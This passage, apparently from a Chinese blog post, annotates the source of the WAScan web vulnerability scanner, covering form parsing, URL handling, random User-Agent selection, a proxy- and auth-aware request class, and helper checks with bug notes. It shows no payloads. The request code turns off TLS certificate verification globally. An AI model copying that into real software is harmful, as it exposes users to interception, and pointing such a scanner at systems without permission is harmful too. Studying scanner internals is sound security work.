form.split(<span class="string">'/&gt;'</span>):</div><div class="line">			<span class="keyword">if</span> search(<span class="string">r'\&lt;input'</span>,inputs,I):</div><div class="line">				<span class="keyword">try</span>:</div><div class="line">					<span class="comment"># name</span></div><div class="line">					name = self.check_name_value(findall(<span class="string">r'name=[\'\"](.+?)[\'\"]'</span>,inputs,I))</div><div class="line">					<span class="comment"># value</span></div><div class="line">					value = self.check_name_value(findall(<span class="string">r'value=[\'\"](.+?)[\'\"]'</span>,inputs,I))</div><div class="line">					name_value = <span class="string">"%s=%s"</span>%(name,value)</div><div class="line">					<span class="keyword">if</span> len(query) == <span class="number">0</span>:query.append(name_value)</div><div class="line">					<span class="keyword">if</span> len(query) == <span class="number">1</span>:query[<span class="number">0</span>] += <span class="string">"&amp;%s"</span>%(name_value) </div><div class="line">				<span class="keyword">except</span> Exception,e:</div><div class="line">					<span class="keyword">pass</span></div><div class="line">		<span class="comment"># 根据 method 的不同，组装url</span></div><div class="line">		<span class="keyword">if</span> action:</div><div class="line">			<span class="keyword">if</span> method.lower() == <span class="string">"get"</span>:</div><div class="line">				<span class="keyword">if</span> query != []:</div><div class="line">					<span class="keyword">return</span> <span class="string">"%s?%s"</span>%(action,query[<span class="number">0</span>])</div><div class="line">				<span class="keyword">return</span> action</div><div class="line">			<span class="keyword">elif</span> method.lower() == <span class="string">"post"</span>:</div><div class="line">				<span class="keyword">if</span> query != []:</div><div class="line">					<span class="keyword">return</span> action,query[<span class="number">0</span>]</div><div class="line">				<span class="keyword">return</span> action</div><div class="line">		<span class="comment"># 注，这里存在BUG。</span></div><div class="line">		<span class="comment"># 调用链 form = self.form()</span></div><div class="line">		<span class="comment">#	form() 的返回 return self.extract_form(str(form),self.url)</span></div><div class="line">		<span class="comment">#   extract_form  在 method为 POST 且 query != []  的情况下 ，</span></div><div class="line">		<span class="comment"># 				  return action,query[0]  </span></div><div class="line">		<span class="comment">#                 会丢失掉 query[0] 即 POST 的参数</span></div><div class="line"></div><div class="line">	<span class="comment"># 获取绝对URL</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">absolute</span><span class="params">(self,link)</span>:</span></div><div class="line">		<span class="string">""" make absolute url """</span></div><div class="line">		link = self.check_ext(link)</div><div class="line">		parts = urlsplit(link)</div><div class="line">		<span class="comment"># urlsplit </span></div><div class="line">		scheme = ucode(parts.scheme)</div><div class="line">		netloc = ucode(parts.netloc)</div><div class="line">		path = ucode(parts.path) <span class="keyword">or</span> <span class="string">'/'</span></div><div class="line">		query = ucode(parts.query)</div><div class="line">		<span class="comment"># make </span></div><div class="line">		<span class="keyword">if</span> scheme == <span class="string">'http'</span> <span class="keyword">or</span> scheme == <span class="string">'https'</span>:</div><div class="line">			<span class="keyword">if</span> netloc != <span class="string">""</span>:</div><div class="line">				<span class="keyword">if</span> netloc <span class="keyword">in</span> self.netloc:</div><div class="line">					<span class="keyword">return</span> urlunparse((scheme,netloc,path,<span class="string">''</span>,query,<span class="string">''</span>))</div><div class="line">		<span class="comment">#</span></div><div class="line">		<span class="keyword">elif</span> link.startswith(<span class="string">'//'</span>):</div><div class="line">			<span class="keyword">if</span> netloc != <span class="string">""</span>:</div><div class="line">				<span class="keyword">if</span> self.netloc <span class="keyword">in</span> netloc:</div><div class="line">					<span class="keyword">return</span> urlunparse((self.scheme,netloc,(path <span class="keyword">or</span> <span class="string">'/'</span>),<span class="string">''</span>,query,<span class="string">''</span>))</div><div class="line">		<span class="comment">#</span></div><div class="line">		<span class="keyword">elif</span> link.startswith(<span class="string">'/'</span>):</div><div class="line">			<span class="keyword">return</span> urlunparse((self.scheme,self.netloc,path,<span class="string">''</span>,query,<span class="string">''</span>))</div><div class="line">		<span class="comment">#</span></div><div class="line">		<span class="keyword">elif</span> link.startswith(<span class="string">'?'</span>):</div><div class="line">			<span class="keyword">return</span> urlunparse((self.scheme,self.netloc,path,<span class="string">''</span>,query,<span class="string">''</span>))</div><div class="line">		<span class="comment">#</span></div><div class="line">		<span class="keyword">elif</span> link == <span class="string">""</span> <span class="keyword">or</span> link.startswith(<span class="string">'#'</span>):</div><div class="line">			<span class="keyword">return</span> self.url </div><div class="line">		<span class="comment">#</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">return</span> urlunparse((self.scheme,self.netloc,path,<span class="string">''</span>,query,<span class="string">''</span>))</div></pre></td></tr></table></figure></p>
<h2 id="User-Agent：-lib-request-ragent-py"><a href="#User-Agent：-lib-request-ragent-py" class="headerlink" title="User Agent： lib/request/ragent.py"></a>User Agent： lib/request/ragent.py</h2><p>生成随机的 User-Agent。命令行选项<code>wascan.py  --ragent</code>开启。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ragent</span><span class="params">()</span>:</span></div><div class="line">	<span class="string">"""random agent"""</span></div><div class="line">	user_agents = ()</div><div class="line">	realpath = path.join(path.realpath(__file__).split(<span class="string">'lib'</span>)[<span class="number">0</span>],<span class="string">'lib/db/'</span>)</div><div class="line">	realpath += <span class="string">"useragent.wascan"</span></div><div class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> readfile(realpath):</div><div class="line">		user_agents += (_,)</div><div class="line">	<span class="keyword">return</span> user_agents[randint(<span class="number">0</span>,len(user_agents)<span class="number">-1</span>)]</div></pre></td></tr></table></figure></p>
<h2 id="请求：lib-requests-request-py"><a href="#请求：lib-requests-request-py" class="headerlink" title="请求：lib/requests/request.py"></a>请求：lib/requests/request.py</h2><p>基本请求。包括请求/代理认证，请求，重定向，响应的处理。</p>
<p>两个方法用于请求/代理认证<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> hasattr(ssl, <span class="string">'_create_unverified_context'</span>): </div><div class="line">    ssl._create_default_https_context = ssl._create_unverified_context</div><div class="line"></div><div class="line"><span class="comment"># BasicAuthCredentials 用来处理 认证相关的信息</span></div><div class="line"><span class="comment"># 	wascan.py --url xxx --proxy yyy --proxy-auth "root:1234"</span></div><div class="line"><span class="comment"># 	wascan.py --url xxx --auth "admin:1233"</span></div><div class="line"></div><div class="line"><span class="comment"># In [20]: creds = "admin:123"</span></div><div class="line"><span class="comment"># In [21]: BasicAuthCredentials(creds)</span></div><div class="line"><span class="comment"># Out[21]: ('admin', '123')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">BasicAuthCredentials</span><span class="params">(creds)</span>:</span></div><div class="line">	<span class="comment"># return tuple</span></div><div class="line">	<span class="keyword">return</span> tuple(</div><div class="line">		creds.split(<span class="string">':'</span>)</div><div class="line">		)</div><div class="line"></div><div class="line"><span class="comment"># wascan.py --url xxx --scan yyy --proxy 10.10.10.10:80 </span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ProxyDict</span><span class="params">(proxy)</span>:</span></div><div class="line">	<span class="comment"># return dict</span></div><div class="line">	<span class="keyword">return</span> &#123;</div><div class="line">		<span class="string">'http'</span>  : proxy,</div><div class="line">		<span class="string">'https'</span> : proxy</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>Request类，发送基本请求，处理头部参数，认证、代理、cookie、超时等问题。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span><span class="params">(object)</span>:</span></div><div class="line">	<span class="string">"""docstring for Request"""</span></div><div class="line">	<span class="comment"># 接受参数</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,*kwargs)</span>:</span></div><div class="line">		self.kwargs = kwargs</div><div class="line">	</div><div class="line">	<span class="comment"># 发送请求</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">Send</span><span class="params">(self,url,method=<span class="string">"get"</span>,data=None,headers=None)</span>:</span></div><div class="line">		<span class="comment"># make a request</span></div><div class="line">		<span class="comment"># 提取各项参数 并 保存到 __dict__ ，后期进一步处理</span></div><div class="line">		_dict_ = self.kwargs[<span class="number">0</span>] <span class="comment"># self.kwargs is a tuple, select [0]</span></div><div class="line">		<span class="comment"># 获取各项值</span></div><div class="line">		auth = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"auth"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"auth"</span>]</div><div class="line">		agent = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"agent"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"agent"</span>]</div><div class="line">		proxy = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"proxy"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"proxy"</span>]</div><div class="line">		pauth = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"pauth"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"pauth"</span>]</div><div class="line">		cookie = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"cookie"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"cookie"</span>]</div><div class="line">		timeout = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"timeout"</span>]</div><div class="line">		redirect = <span class="keyword">True</span> <span class="keyword">if</span> <span class="string">"redirect"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"redirect"</span>]</div><div class="line">		_headers_ = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"headers"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"headers"</span>]</div><div class="line">		_data_ = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"data"</span> <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"data"</span>]</div><div class="line">		_method_ = <span class="keyword">None</span> <span class="keyword">if</span> <span class="string">"method"</span>  <span class="keyword">not</span> <span class="keyword">in</span> _dict_ <span class="keyword">else</span> _dict_[<span class="string">"method"</span>]</div><div class="line">		<span class="comment"># set method </span></div><div class="line">		<span class="keyword">if</span> method:</div><div class="line">			<span class="keyword">if</span> _method_ != <span class="keyword">None</span>:</div><div class="line">				method = _method_.upper()</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				method = method.upper()</div><div class="line">		<span class="comment"># set data</span></div><div class="line">		<span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">			<span class="keyword">if</span> _data_ != <span class="keyword">None</span>:</div><div class="line">				data = _data_</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				data = &#123;&#125;</div><div class="line">		<span class="comment"># if headers == None: headers = &#123;&#125;</span></div><div class="line">		<span class="keyword">if</span> headers <span class="keyword">is</span> <span class="keyword">None</span>: headers = &#123;&#125;</div><div class="line"></div><div class="line">		<span class="comment"># if auth == None: auth = () </span></div><div class="line">		<span class="keyword">if</span> auth <span class="keyword">is</span> <span class="keyword">None</span>: auth = ()</div><div class="line"></div><div class="line">		<span class="comment"># set request headers</span></div><div class="line">		<span class="comment"># add user-agent header value</span></div><div class="line">		<span class="keyword">if</span> <span class="string">'User-Agent'</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</div><div class="line">			headers[<span class="string">'User-Agent'</span>] = agent</div><div class="line">		<span class="comment"># _headers_ add to headers</span></div><div class="line">		<span class="keyword">if</span> isinstance(_headers_,dict):</div><div class="line">			headers.update(_headers_)</div><div class="line"></div><div class="line">		<span class="comment"># 处理 认证 、代理</span></div><div class="line">		<span class="comment"># process basic authentication</span></div><div class="line">		<span class="keyword">if</span> auth != <span class="keyword">None</span> <span class="keyword">and</span> auth != ():</div><div class="line">			<span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span>  auth:</div><div class="line">				authorization = (<span class="string">"%s:%s"</span>%(BasicAuthCredentials(auth))).encode(<span class="string">'base64'</span>)</div><div class="line">				headers[<span class="string">'Authorization'</span>] = <span class="string">"Basic %s"</span>%(authorization.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">		<span class="comment"># process proxy basic authorization</span></div><div class="line">		<span class="keyword">if</span> pauth != <span class="keyword">None</span>:</div><div class="line">			<span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span> pauth:</div><div class="line">				proxy_authorization = (<span class="string">"%s:%s"</span>%(BasicAuthCredentials(pauth))).encode(<span class="string">'base64'</span>)</div><div class="line">				headers[<span class="string">'Proxy-authorization'</span>] = <span class="string">"Basic %s"</span>%(proxy_authorization.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">		<span class="comment"># 处理 超时问题</span></div><div class="line">		<span class="comment"># process socket timeout</span></div><div class="line">		<span class="keyword">if</span> timeout != <span class="keyword">None</span>:</div><div class="line">			socket.setdefaulttimeout(timeout)</div><div class="line">		<span class="comment"># set handlers</span></div><div class="line">		<span class="comment"># handled http and https </span></div><div class="line">		handlers = [urllib2.HTTPHandler(),urllib2.HTTPSHandler()]</div><div class="line"></div><div class="line">		<span class="comment"># process cookie handler</span></div><div class="line">		<span class="keyword">if</span> <span class="string">'Cookie'</span> <span class="keyword">not</span> <span class="keyword">in</span> headers:</div><div class="line">			<span class="keyword">if</span> cookie != <span class="keyword">None</span> <span class="keyword">and</span> cookie != <span class="string">""</span>:</div><div class="line">				headers[<span class="string">'Cookie'</span>] = cookie</div><div class="line">			<span class="comment"># handlers.append(HTTPCookieProcessor(cookie))</span></div><div class="line"></div><div class="line">		<span class="comment"># process redirect</span></div><div class="line">		<span class="comment"># 处理是否跳转 ， NoRedirectHandler 定义见下</span></div><div class="line">		<span class="keyword">if</span> redirect != <span class="keyword">True</span>:</div><div class="line">			handlers.append(NoRedirectHandler)</div><div class="line"></div><div class="line">		<span class="comment"># process proxies</span></div><div class="line">		<span class="keyword">if</span> proxy:</div><div class="line">			proxies = ProxyDict(proxy)</div><div class="line">			handlers.append(urllib2.ProxyHandler(proxies))</div><div class="line"></div><div class="line">		<span class="comment"># install opener</span></div><div class="line">		opener = urllib2.build_opener(*handlers)</div><div class="line">		urllib2.install_opener(opener)</div><div class="line">		</div><div class="line">		<span class="comment"># process method</span></div><div class="line">		<span class="comment"># method get </span></div><div class="line">		<span class="keyword">if</span> method == <span class="string">"GET"</span>:</div><div class="line">			<span class="keyword">if</span> data: url = <span class="string">"%s?%s"</span>%(url,data)</div><div class="line">			req = urllib2.Request(url,headers=headers)</div><div class="line">		<span class="comment"># other methods</span></div><div class="line">		<span class="keyword">elif</span> method == <span class="string">"POST"</span>:</div><div class="line">			req = urllib2.Request(url,data=data,headers=headers)</div><div class="line">		<span class="comment"># other methods</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			req = urllib2.Request(url,headers=headers)</div><div class="line">			req.get_method = <span class="keyword">lambda</span> : method</div><div class="line">		<span class="comment"># response object</span></div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			resp = urllib2.urlopen(req)</div><div class="line">		<span class="keyword">except</span> urllib2.HTTPError,e:			</div><div class="line">			resp = e</div><div class="line">		<span class="keyword">except</span> socket.error,e:</div><div class="line">			exit(warn(<span class="string">'Error: %s'</span>%e))</div><div class="line">		<span class="keyword">except</span> urllib2.URLError,e:</div><div class="line">			exit(warn(<span class="string">'Error: %s'</span>%e))</div><div class="line">		<span class="keyword">return</span> ResponseObject(resp)</div></pre></td></tr></table></figure></p>
<p><code>NoRedirectHandler</code>，不进行跳转。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoRedirectHandler</span><span class="params">(urllib2.HTTPRedirectHandler)</span>:</span></div><div class="line">	<span class="string">"""docstring for NoRedirectHandler"""</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">http_error_302</span><span class="params">(self,req,fp,code,msg,headers)</span>:</span></div><div class="line">		<span class="keyword">pass</span></div><div class="line">	<span class="comment">#  http status code 302</span></div><div class="line">	http_error_302 = http_error_302 = http_error_302 = http_error_302</div></pre></td></tr></table></figure></p>
<p>响应处理类。获取响应内容，响应url，响应的status_code，响应的头部。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResponseObject</span><span class="params">(object)</span>:</span></div><div class="line">	<span class="string">"""docstring for ResponseObject"""</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,resp)</span>:</span></div><div class="line">		<span class="comment"># get content</span></div><div class="line">		self.content = resp.read()</div><div class="line">		<span class="comment"># get url </span></div><div class="line">		self.url = resp.geturl()</div><div class="line">		<span class="comment"># get status code</span></div><div class="line">		self.code = resp.getcode()</div><div class="line">		<span class="comment"># get headers</span></div><div class="line">		self.headers = resp.headers.dict</div></pre></td></tr></table></figure></p>
<h1 id="lib-utils-文件夹"><a href="#lib-utils-文件夹" class="headerlink" title="lib/utils 文件夹"></a>lib/utils 文件夹</h1><p>主要是定义一些小功能、小工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">│   └── utils</div><div class="line">│       ├── check.py</div><div class="line">│       ├── colors.py</div><div class="line">│       ├── dirs.py</div><div class="line">│       ├── exception.py</div><div class="line">│       ├── __init__.py</div><div class="line">│       ├── params.py</div><div class="line">│       ├── payload.py</div><div class="line">│       ├── printer.py</div><div class="line">│       ├── rand.py</div><div class="line">│       ├── readfile.py</div><div class="line">│       ├── settings.py</div><div class="line">│       ├── unicode.py</div><div class="line">│       └── usage.py</div></pre></td></tr></table></figure></p>
<h2 id="package标识：lib-utils-init-py"><a href="#package标识：lib-utils-init-py" class="headerlink" title="package标识：lib/utils/init.py"></a>package标识：lib/utils/<strong>init</strong>.py</h2><p>无，跳过</p>
<h2 id="基本检查：lib-utils-check-py"><a href="#基本检查：lib-utils-check-py" class="headerlink" title="基本检查：lib/utils/check.py"></a>基本检查：lib/utils/check.py</h2><p>如名，主要进行一些前期的检查准备。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python </span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># @name:    Wascan - Web Application Scanner</span></div><div class="line"><span class="comment"># @repo:    https://github.com/m4ll0k/Wascan</span></div><div class="line"><span class="comment"># @author:  Momo Outaadi (M4ll0k)</span></div><div class="line"><span class="comment"># @license: See the file 'LICENSE.txt'</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> re <span class="keyword">import</span> sub,I,findall</div><div class="line"><span class="keyword">from</span> lib.utils.colors <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> lib.utils.printer <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlsplit,urljoin</div><div class="line"><span class="keyword">from</span> lib.utils.rand <span class="keyword">import</span> r_string</div><div class="line"></div><div class="line"><span class="comment"># CPath 检查路径，用于处理 绝对/相对路径，生成完整路径</span></div><div class="line"><span class="comment"># 实际调用 urlparse 的 urljoin</span></div><div class="line"><span class="comment"># In [43]: CPath("http://www.google.com/1/aaa.html","bbbb.html")</span></div><div class="line"><span class="comment"># Out[43]: 'http://www.google.com/1/bbbb.html'</span></div><div class="line"></div><div class="line"><span class="comment"># In [44]: CPath("http://www.google.com/1/aaa.html","/2/bbbb.html")</span></div><div class="line"><span class="comment"># Out[44]: 'http://www.google.com/2/bbbb.html'</span></div><div class="line"></div><div class="line"><span class="comment"># In [45]: CPath("http://www.google.com/1/aaa.html","2/bbbb.html")</span></div><div class="line"><span class="comment"># Out[45]: 'http://www.google.com/1/2/bbbb.html'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CPath</span><span class="params">(url,path)</span>:</span></div><div class="line">	<span class="keyword">return</span> urljoin(url,path)</div><div class="line"></div><div class="line"><span class="comment"># 生成随机参数值</span></div><div class="line"><span class="comment"># 这段代码存在bug</span></div><div class="line"><span class="comment"># In [49]: AParams("test=chybeta")</span></div><div class="line"><span class="comment"># ---------------------------------------------------------------------------</span></div><div class="line"><span class="comment"># TypeError                                 Traceback (most recent call last)</span></div><div class="line"><span class="comment"># &lt;ipython-input-49-103eb92ad1e0&gt; in &lt;module&gt;()</span></div><div class="line"><span class="comment"># ----&gt; 1 AParams("test=chybeta")</span></div><div class="line"><span class="comment"># /media/chybeta/security/tool/scanner/WAScan/lib/utils/check.py in AParams(params)</span></div><div class="line"><span class="comment">#      21                 return "%s=%s"%(params,random_string)</span></div><div class="line"><span class="comment">#      22         else:</span></div><div class="line"><span class="comment"># ---&gt; 23                 return "%s%s"%(r_string(10)).upper()</span></div><div class="line"><span class="comment">#      24         return params</span></div><div class="line"><span class="comment">#      25 </span></div><div class="line"><span class="comment"># TypeError: not enough arguments for format string</span></div><div class="line"><span class="comment"># fix bug：</span></div><div class="line"><span class="comment"># return "%s%s"%(params, random_string)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">AParams</span><span class="params">(params)</span>:</span></div><div class="line">	random_string = <span class="string">"%s"</span>%(r_string(<span class="number">10</span>)).upper()</div><div class="line">	<span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> params:</div><div class="line">		<span class="keyword">return</span> <span class="string">"%s=%s"</span>%(params,random_string)</div><div class="line">	</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="comment"># 这里如果 = 已经出现在 params 中了</span></div><div class="line">		<span class="keyword">return</span> <span class="string">"%s%s"</span>%(r_string(<span class="number">10</span>)).upper()</div><div class="line">	<span class="keyword">return</span> params</div><div class="line"></div><div class="line"><span class="comment"># CQuery 拼接 url 和 查询参数 ，主要针对 GET请求</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CQuery</span><span class="params">(url,params)</span>:</span></div><div class="line">	<span class="comment"># 生成参数值对</span></div><div class="line">	params = AParams(params)</div><div class="line">	<span class="comment"># http://test.com/?</span></div><div class="line">	<span class="keyword">if</span> url.endswith(<span class="string">'?'</span>):</div><div class="line">		<span class="comment"># 直接加上 参数</span></div><div class="line">		<span class="keyword">return</span> url+params</div><div class="line">	<span class="comment"># 如果不是</span></div><div class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> url.endswith(<span class="string">'?'</span>):</div><div class="line">		<span class="comment"># http://test.com/a&amp;</span></div><div class="line">		<span class="keyword">if</span> url.endswith(<span class="string">'&amp;'</span>):</div><div class="line">			<span class="comment"># 也可以直接加上参数</span></div><div class="line">			<span class="keyword">return</span> url+params</div><div class="line">		<span class="comment"># http://test.com/?a=1 </span></div><div class="line">		<span class="keyword">elif</span> <span class="string">'?'</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">'&amp;'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</div><div class="line">			<span class="comment"># 需要加上  &amp; 符号</span></div><div class="line">			<span class="keyword">return</span> url+<span class="string">'&amp;'</span>+params</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># 其他情况，干脆直接 加 ?</span></div><div class="line">			<span class="keyword">return</span> url+<span class="string">"?"</span>+params</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="comment"># 这句话多余？？？？</span></div><div class="line">		